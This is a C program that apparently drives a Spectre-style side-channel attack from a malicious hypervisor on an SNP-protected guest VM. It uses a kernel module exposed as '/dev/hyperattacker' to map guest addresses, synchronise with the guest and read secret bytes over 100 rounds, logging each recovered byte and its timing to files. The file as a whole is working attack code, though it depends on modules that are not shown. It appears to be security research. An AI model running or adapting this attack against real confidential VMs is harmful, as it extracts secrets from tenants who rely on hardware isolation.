#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <unistd.h>
#include <time.h>
#include <string.h>
#include <stdint.h>
#include "../../host-module/main.h"
#include "../../host-utils/user-utils.h"

#define ROUNDS (int)100

uint8_t secrets[ROUNDS] = {0};
double latencies[ROUNDS] = {0};
char ROOT_DIR[128] = {0};

uint64_t data_gPA;
uint64_t data_ptr;
uint64_t trigger_gPA;
uint64_t trigger_ptr;

void get_gPAs(){
    FILE *fptr;
    char filename[128] = {0};
    sprintf(filename, "%s/spectre/gpas/address", ROOT_DIR);
    fptr = fopen(filename, "r");
    fscanf(fptr, "%lx", &data_gPA);
    fscanf(fptr, "%lx", &trigger_gPA);
    fclose(fptr);
}


int main(int argc, char ** argv){
    get_data_from_json(ROOT_DIR);
    get_gPAs();

    int host_module_fd = open("/dev/hyperattacker", O_RDONLY);
    struct kernel_ptr_spectre_request req_spectre;
    req_spectre.gpa = data_gPA;
    ioctl(host_module_fd, GET_KERNEL_PTR_SPECTRE_SNP, (uint64_t)&req_spectre);
    data_ptr = req_spectre.ptr;

    struct kernel_ptr_request req;
    req.gpa = trigger_gPA;
    ioctl(host_module_fd, GET_KERNEL_PTR, (uint64_t)&req);
    trigger_ptr = req.ptr;
    close(host_module_fd);

    host_module_fd = open("/dev/hyperattacker", O_RDONLY);
    sync_write(host_module_fd, trigger_ptr, HYPERVISOR_TRIGGER);
    while(1){
        if(sync_read(host_module_fd, trigger_ptr) != HYPERVISOR_TRIGGER){
            break;
        }
    }
    close(host_module_fd);

    struct attack_request_monitor_spectre attack_req;
    attack_req.adrs = data_ptr;
    attack_req.trigger_ptr = trigger_ptr;
    host_module_fd = open("/dev/hyperattacker", O_RDONLY);
    ioctl(host_module_fd, MONITOR_SPECTRE, (uint64_t)&attack_req);
    close(host_module_fd);

    for(int i = 0; i < ROUNDS; i++){
        struct timeval tv_end, tv_start;
        gettimeofday(&tv_start,NULL);

        host_module_fd = open("/dev/hyperattacker", O_RDONLY);
        ioctl(host_module_fd, MONITOR_SPECTRE, (uint64_t)&attack_req);
        close(host_module_fd);

        gettimeofday(&tv_end,NULL);
        unsigned long start_time_in_micros = 1000000 * tv_start.tv_sec + tv_start.tv_usec;
        unsigned long time_in_micros = 1000000 * tv_end.tv_sec + tv_end.tv_usec - start_time_in_micros;
        double time_used = (double)time_in_micros / 1000000;
        latencies[i] = time_used;
        secrets[i] = attack_req.result;    
    }

    char filename[128] = {0};
    sprintf(filename, "%s/spectre/results/recovered_secrets", ROOT_DIR);
    FILE *fptr_secrets = fopen(filename, "a");
    sprintf(filename, "%s/spectre/results/time", ROOT_DIR);
    FILE *fptr_time = fopen(filename, "a");
    for(int i = 0; i < ROUNDS; i++){
        fprintf(fptr_secrets, "%02x\n", secrets[i]);
        fprintf(fptr_time, "%f\n", latencies[i]);
    }
    fclose(fptr_time);
    fclose(fptr_secrets);

    host_module_fd = open("/dev/hyperattacker", O_RDONLY);
    sync_write(host_module_fd, trigger_ptr, HYPERVISOR_TRIGGER);
    while(sync_read(host_module_fd, trigger_ptr) == HYPERVISOR_TRIGGER){
    }
    close(host_module_fd);
    return 0;
}


